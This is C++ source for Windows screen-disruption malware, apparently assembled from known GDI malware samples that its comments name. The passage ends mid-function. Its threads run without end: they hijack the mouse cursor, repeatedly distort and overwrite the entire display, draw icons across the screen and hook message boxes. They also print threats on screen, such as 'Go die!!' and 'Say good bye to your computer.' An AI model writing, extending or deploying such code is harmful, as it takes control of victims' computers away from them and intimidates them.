﻿#include<iostream>
#include<stdio.h>
#include<windows.h>
#include<windowsx.h>
#include<math.h>
#include<stdlib.h>
#include<time.h>
#include<conio.h>
#include<tchar.h>
#include<fstream>
#include<windef.h>
#include<memory>
#include<iosfwd>
#include"resource.h"
#pragma comment(lib,"winmm.lib")
#pragma comment(lib,"msimg32.lib")//use lambdaexec Neoarsphenamine\def.h
#define RndRGB RGB(rand() % 255, rand() % 255, rand() % 255)
typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE r;
        BYTE g;
        BYTE b;
        BYTE Reserved;
    };
}_RGBQUAD, * PRGBQUAD;
typedef struct {
    FLOAT h;
    FLOAT s;
    FLOAT l;
} HSL;
namespace Colors {
    //These HSL functions was made by Wipet, credits to him!(write by pankoza)
    //And I Get It To Pankoza's Oxymorphazone source code.cpp(write by coder-linjian)

    HSL rgb2hsl(RGBQUAD rgb) {
        HSL hsl;

        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;

        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;

        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);

        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;

        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

        if (fDelta != 0.f) {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }

        hsl.h = h;
        hsl.s = s;
        hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl) {
        RGBQUAD rgb;

        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;

        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;

        INT sextant;

        if (v > 0.f) {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;

            switch (sextant) {
            case 0:
                r = v;
                g = mid1;
                b = m;
                break;
            case 1:
                r = mid2;
                g = v;
                b = m;
                break;
            case 2:
                r = m;
                g = v;
                b = mid1;
                break;
            case 3:
                r = m;
                g = mid2;
                b = v;
                break;
            case 4:
                r = mid1;
                g = m;
                b = v;
                break;
            case 5:
                r = v;
                g = m;
                b = mid2;
                break;
            }
        }

        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);

        return rgb;
    }
}
int RotateDC(HDC hdc, int Angle, POINT ptCenter) {
    int nGraphicsMode = SetGraphicsMode(hdc, GM_ADVANCED);
    XFORM xform;
    if (Angle != 0) {
        double fangle = (double)Angle / 180. * 3.1415926;
        xform.eM11 = (float)cos(fangle);
        xform.eM12 = (float)sin(fangle);
        xform.eM21 = (float)-sin(fangle);
        xform.eM22 = (float)cos(fangle);
        xform.eDx = (float)(ptCenter.x - cos(fangle) * ptCenter.x + sin(fangle) * ptCenter.y);
        xform.eDy = (float)(ptCenter.y - cos(fangle) * ptCenter.y - sin(fangle) * ptCenter.x);
        SetWorldTransform(hdc, &xform);
    }
    return nGraphicsMode;
}
int red, green, blue; bool ifblue = false;
COLORREF Hue(int length) {
    if (red != length) {
        red < length; red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else {
        if (green != length) {
            green < length; green++;
            return RGB(length, green, 0);
        }
        else {
            if (blue != length) {
                blue < length; blue++;
                return RGB(0, length, blue);
            }
            else {
                red = 0; green = 0; blue = 0;
                ifblue = true;
            }
        }
    }
}
#define PI 3.14159265358979323846
LPCWSTR GetRandomChar(int length) {
    wchar_t* strRandom = new wchar_t[length + 1];
    for (int i = 0; i < length; i++) {
        strRandom[i] = (rand() % 256) + 1024;
    }
    strRandom[length] = L'\0';
    return strRandom;
}
VOID WINAPI ci(int x, int y, int w, int h) {
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
    SelectClipRgn(hdc, hrgn);
    BitBlt(hdc, x, y, w, h, hdc, x + y, x - y, PATINVERT);
    DeleteObject(hrgn);
    ReleaseDC(NULL, hdc);
}
VOID WINAPI MG(HWND hwnd) {
    RECT r; GetWindowRect(hwnd, &r);
    int time = GetTickCount();
    int w = r.right - r.left, h = r.bottom - r.top;
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(hwnd);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 60000)
            byte = rand() % 0xff;
        for (int i = 0; w * h > i; i++) {
            int x = i % w, y = i / h;
            if (i % h == 0 && rand() % 100 == 0)
                v = rand() % 1000;
            *((BYTE*)data + 4 * i + v) = (x ^ y) ^ byte;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
        if (rand() % 48 <= 24) { InvalidateRect(hwnd, 0, 0); }
        Sleep(100);
    }
}
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
    HWND msgboxHWND;
    if (nCode == HCBT_ACTIVATE)
    {
        msgboxHWND = (HWND)wParam;
        Sleep(100);
        HANDLE mbm = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)MG, msgboxHWND, 0, NULL);
        return 0;
    }
    return CallNextHookEx(0, nCode, wParam, lParam);
}
DWORD WINAPI Cursor1_Move(LPVOID lpParam) {
    int signX = 10, signY = 10;
    int x = 0, y = 0;
    while (true) {
        SetCursorPos(x, y);
        if (x <= 0) { signX = 10; }
        if (x >= GetSystemMetrics(0)) { signX = -10; }
        if (y <= 0) { signY = 10; }
        if (y >= GetSystemMetrics(1)) { signY = -10; }
        x += signX; y += signY;
        Sleep(1);
    }
}
DWORD WINAPI Payload1_Big(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        StretchBlt(hdc, -20, 20, w + 40, h - 40, hdc, 0, 0, w, h, SRCERASE);
        HBRUSH hBrush = CreateSolidBrush(Hue(239));
        SelectObject(hdc, hBrush);
        PatBlt(hdc, 0, 0, w, h, PATINVERT);
        DeleteObject(hBrush);
        ReleaseDC(0, hdc);
        Sleep(100);
    }
}
DWORD WINAPI Shader1_ScreenColorfulError(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    PRGBQUAD prgbScreen;
    HDC hdc = GetDC(0);
    HDC hcdc = CreateCompatibleDC(hdc);
    HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&prgbScreen, NULL, 0);
    SelectObject(hcdc, hBitmap);
    for (;;) {
        hdc = GetDC(0);
        for (int x = 0; x < w; x++) {
            COLORREF rrr = RndRGB;
            for (int y = 0; y < h; y++) {
                prgbScreen[x + w * y].rgb = rrr;
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc); DeleteDC(hdc);
        Sleep(100);
    }
}
DWORD WINAPI Shader2_666_th3a(LPVOID lpParam) {//from XUGE.exe
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            rgbScreen[i].rgb -= 666;
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        Sleep(100);
        ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
    }
}
DWORD WINAPI Payload2_Icon1_th3b(LPVOID lpParam) {
    int signX = 10, signY = 10;
    int x = 0, y = 0;
    HICON hIcon = LoadIcon(0, IDI_ERROR);
    while (true) {
        DrawIcon(GetDC(0), x, y, hIcon);
        if (x <= 0) { signX = 10; hIcon = LoadIcon(0, IDI_ERROR); }
        if (x >= GetSystemMetrics(0)) { signX = -10; hIcon = LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON1)); }
        if (y <= 0) { signY = 10; hIcon = LoadIcon(0, IDI_WINLOGO); }
        if (y >= GetSystemMetrics(1)) { signY = -10; hIcon = LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)); }
        x += signX; y += signY;
        Sleep(1);
    }
}
DWORD WINAPI Shader3_Gourd(LPVOID lpParam) {//fram skidder MazeIcon skid malware,but I modified it.
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hsl;
    for (;;) {
        hdc = GetDC(NULL); HDC hdcCopy = CreateCompatibleDC(hdc);
        if (hdcCopy == NULL) { ReleaseDC(NULL, hdc); continue; }
        bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hdcCopy, bmp);
        float i = 0;
        while (true) {
            hdc = GetDC(NULL); int x1, y1, w1, h1;
            StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
            RGBQUAD rgbquadCopy;
            for (int x = 0; x < w; x++) {
                for (int y = 0; y < h; y++) {
                    int index = y * w + x;
                    double fractalX = (2.5f / w);
                    double fractalY = (1.90f / h);
                    double cx = (x * fractalX - 2);
                    double cy = (y * fractalY - 0.9);
                    double zx = 0;
                    double zy = 0;
                    int fx = 0;
                    while (((zx * zx) + (zy * zy)) < 10 && fx < 50) {
                        double fczx = zx * zx - zy * zy + cx;
                        double fczy = 3 * zx * zy + cy;
                        zx = fczx;
                        zy = fczy;
                        fx++;
                        hsl.h = fmod(fx / (i + 1) + y / h * .1f + i / 1000.f, 1.f);
                        hsl.s = 0.5f;
                        hsl.l = 0.3f;
                        rgbquad[index] = Colors::hsl2rgb(hsl);
                    }
                }
            }
            i++;
            StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
            ReleaseDC(NULL, hdc); DeleteDC(hdc);
        }
    }
}
DWORD WINAPI Shader4_NoName(LPVOID lpParam) {//made by myself
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbScreen[i].rgb += x | y * (i & (x + y));
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        Sleep(100);
        ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
    }
}
DWORD WINAPI Shader5_GrayMove_th6a(LPVOID lpParam) {//from Platinum.exe
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 60000)
            byte = rand() % 0xff;
        for (int i = 0; w * h > i; i++) {
            if (i % h == 0 && rand() % 100 == 0)
                v = rand() % 25;
            *((BYTE*)data + 4 * i + v) = *((BYTE*)(data + i + v));
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
}
DWORD WINAPI Payload3_Icon2_th6b(LPVOID lpParam) {
    int signX = 2, signY = 2;
    int x = 0, y = 0;
    float angleX, angleY;
    int i = 0;
    int rrr = 0;
    HICON hIcon[] = { LoadIcon(0,IDI_ERROR),LoadIcon(0,IDI_WARNING),LoadIcon(0,IDI_QUESTION),LoadIcon(0,IDI_INFORMATION),LoadIcon(0,IDI_ASTERISK),LoadIcon(0, IDI_SHIELD),LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON1)),LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)),LoadCursor(0,IDC_ARROW),LoadCursor(0,IDC_HELP) };
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        angleX = 200 * cos(i / 200.f * PI); angleX = angleX - (angleX / 2);
        angleY = 200 * sin(i / 200.f * PI); angleY = angleY - (angleY / 2);
        DrawIcon(GetDC(0), x + angleX, y + angleY, hIcon[rrr]);
        if (x <= 0) { signX = 2; rrr = rand() % 10; }
        if (y <= 0) { signY = 2; rrr = rand() % 10; }
        if (x >= w) { signX = -2; rrr = rand() % 10; }
        if (y >= h) { signY = -2; rrr = rand() % 10; }
        x += signX; y += signY;
        i+=20;
        Sleep(1);
    }
}
DWORD WINAPI Shader6_Rainble_th7a(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    for (;;) {
        hdc = GetDC(0); HDC hdcCopy = CreateCompatibleDC(hdc);
        if (hdcCopy == 0) { ReleaseDC(0, hdc); continue; }
        bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hdcCopy, bmp);
        INT i = 0;
        for (;;) {
            hdc = GetDC(NULL);
            StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
            for (int x = 0; x < w; x++) {
                for (int y = 0; y < h; y++) {
                    int index = y * w + x;
                    int fx = (int)((i ^ 4) + (i * 4) * pow(x * y, (1.0 / 3.0)));
                    hslcolor = Colors::rgb2hsl(rgbquad[index]);
                    hslcolor.h = fmod(fx / 300.f + y / h * .1f + i / 1000.f, 1.f);
                    rgbquad[index] = Colors::hsl2rgb(hslcolor);
                }
            }
            i++;
            StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
            ReleaseDC(NULL, hdc); DeleteDC(hdc);
            Sleep(100);
        }
    }
}
DWORD WINAPI Payload4_TextCross_th7b(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        int x, y;
        DrawIconEx(GetDC(0), x = rand() % w, y = rand() % h, LoadCursor(0, IDC_CROSS), rand() % (w - x), rand() % (h - y), 0, NULL, DI_NORMAL);
        DrawIconEx(GetDC(0), x = rand() % w, y = rand() % h, LoadCursor(0, IDC_IBEAM), rand() % (w - x), rand() % (h - y), 0, NULL, DI_NORMAL);
        Sleep(100);
    }
}
DWORD WINAPI Shader7_ScreenError(LPVOID lpParam) {//from Platinum.exe
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                int fx = (int)(x ^ y);
                rgbquad[index].rgbRed += fx;
                rgbquad[index].rgbGreen += fx;
                rgbquad[index].rgbBlue += fx;
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc); DeleteDC(hdc);
    }
}
DWORD WINAPI Shader8_Red(LPVOID lpParam) {//from Platinum.exe
    HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    BITMAPINFO bmi = { 40, sw, sh, 1, 24 };
    PRGBTRIPLE rgbtriple;
    for (;;) {
        desk = GetDC(0);
        HDC deskMem = CreateCompatibleDC(desk);
        HBITMAP scr = CreateDIBSection(desk, &bmi, 0, (void**)&rgbtriple, 0, 0);
        SelectObject(deskMem, scr);
        BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
        for (int i = 0; i < sw * sh; i++) {
            rgbtriple[i].rgbtRed = (rgbtriple[i].rgbtRed * 2) % (RGB(255, 0, 0));
            rgbtriple[i].rgbtGreen = (rgbtriple[i].rgbtGreen * 2) % (RGB(0, 255, 0));
            rgbtriple[i].rgbtBlue = (rgbtriple[i].rgbtBlue * 2) % (RGB(0, 0, 255));
        }
        BitBlt(desk, 0, 0, sw, sh, deskMem, 0, 0, SRCCOPY);
        ReleaseDC(wnd, desk);
        DeleteDC(desk); DeleteDC(deskMem); DeleteObject(scr); DeleteObject(wnd); DeleteObject(rgbtriple); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&bmi);
        Sleep(100);
    }
}
DWORD WINAPI Payload5a_Shake(LPVOID lpParam) {//from radiance.exe
    srand(time(NULL));
    while (true) {
        int rop = SRCCOPY; int luckynum = rand() % 5;
        if (luckynum == 2) { rop = SRCAND; }
        else if (luckynum == 4) { rop = SRCPAINT; }
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 6, rand() % 6, w, h, hdc, rand() % 6, rand() % 6, rop);
        ReleaseDC(0, hdc);
        DeleteDC(hdc);
        Sleep(10);
    }
}
DWORD WINAPI Payload5b_Invert(LPVOID lpParam) {//from radiance.exe
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1), count = 0; double size = w * 1.5;
    while (true) {
        srand(time(NULL));
        int x = w / 2, y = h / 2; int i = 0;
        for (i = 0; i < size; i += 2) {
            ci(x - (i / 2), y - (i / 2), i, i);
            if (count == 10) {
                count = 0; Sleep(1);
            }
            else {
                count++;
            }
        }
    }
    return 0;
}
DWORD WINAPI Payload5c_Icon3(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1), size = 0;
    while (true) {
        HICON shifang = LoadIcon(NULL, MAKEINTRESOURCE(32512 + rand() % 4));
        HDC hdc = GetDC(0);
        DrawIcon(hdc, rand() % w, rand() % h, shifang);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        DeleteDC(hdc);
        Sleep(10);
    }
}
DWORD WINAPI Payload5d_TextOut(LPVOID lpParam) {//from Tatsuium
    LPCSTR texts[] = { "Go die!!","You will asleep after you see this screen.","still still. >:)","This equipment is useless.","L0L","Say good bye to your computer.","You don't want to life.","You like a baby."};
    while (true) {
        int rdx = 1 + rand() % 3; int xxx = (rdx * 10) - 10;
        int tmp = rand() % 8, color = RGB(rand() % 255, rand() % 255, rand() % 255);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        SetBkMode(hdc, 0);
        SetTextColor(hdc, color);
        HFONT font = CreateFontA(50, 30, rand() % 100, rand() % 100, FW_DONTCARE, 0, 0, 0, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, FF_DONTCARE, "@");
        SelectObject(hdc, font);
        TextOutA(hdc, rand() % w, rand() % h, texts[tmp], strlen(texts[tmp]));
        ReleaseDC(0, hdc);
        DeleteObject(font);
        DeleteDC(hdc);
        Sleep(25);
    }
}
DWORD WINAPI Shader9_NoName2(LPVOID lpParam) {//From Platinum.exe
    int fadsfsfdsfsds = 0;
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmi = { 0 };
        PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbScreen[i].r = -((i * x) * (i & y) + w * fadsfsfdsfsds * 2) / 128;
            rgbScreen[i].g = ((i * x) & (i ^ x) + w * fadsfsfdsfsds * 3) / 256;
            rgbScreen[i].b = ((i * y) >> (i & y) + w * fadsfsfdsfsds * 4) / 512;
        }
        fadsfsfdsfsds++;
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1);
    }
}
DWORD WINAPI Shader10_NoName3(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
    HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hcdc, hBitmap);
    for (int t = 0;; t++) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
        for (int i = 0; i < w * h; i++) {
            rgbScreen[i].rgb += i * t * 114;
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); DeleteDC(hdc);
    }
}
DWORD WINAPI Shader11_DarkRoom(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
    HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hcdc, hBitmap);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            rgbScreen[i].rgb -= 114514;
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); DeleteDC(hdc);
        Sleep(100);
    }
}
DWORD WINAPI Shader12_Gourd2_th14a(LPVOID lpParam) {//from Mazeicon skidded malware,but I modified it
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    PRGBQUAD rgbquad = NULL;
    HSL hsl;
    for (;;) {
        hdc = GetDC(NULL); HDC hdcCopy = CreateCompatibleDC(hdc);
        if (hdcCopy == NULL) { ReleaseDC(NULL, hdc); continue; }
        bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hdcCopy, bmp);
        float i = 0;
        while (true) {
            hdc = GetDC(NULL); int x1, y1, w1, h1;
            StretchBlt(hdcCopy, 20, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
            StretchBlt(hdcCopy, 0 - w + 20, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
            RGBQUAD rgbquadCopy;
            for (int x = 0; x < w; x++) {
                for (int y = 0; y < h; y++) {
                    int index = y * w + x;
                    double fractalX = (2.5f / w);
                    double fractalY = (1.90f / h);
                    double cx = (x * fractalX - 2);
                    double cy = (y * fractalY - 0.9);
                    double zx = 0;
                    double zy = 0;
                    int fx = 0;
                    while (((zx * zx) + (zy * zy)) < 10 && fx < 50) {
                        double fczx = zx * zx - zy * zy + cx;
                        double fczy = 3 * zx * zy + cy;
                        zx = fczx;
                        zy = fczy;
                        fx++;
                    }
                    if (fx == 50) { rgbquad[index].rgb ^= RGB(255, 255, 255); }
                }
            }
            i++;
            StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
            ReleaseDC(NULL, hdc); DeleteDC(hdc);
            Sleep(59);
        }
    }
}
DWORD WINAPI Payload6_CircleZ_th14b(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        int x = rand() % w, y = rand() % h;
        int width = 30;
        int tmpw = 30;
        for (int i = 0; i <= 8; i++) {
            ci(x, y, tmpw, tmpw);
            tmpw += width * 2;
            x -= width;
            y -= width;
        }
    }
}
DWORD WINAPI Shader13_Circling(LPVOID lpParam) {//from ScreenDestroyer.scr
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC dc = GetDC(NULL);
    HDC dcCopy = CreateCompatibleDC(dc);
    int ws = w / 4;
    int hs = h / 4;
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = ws;
    bmpi.bmiHeader.biHeight = hs;
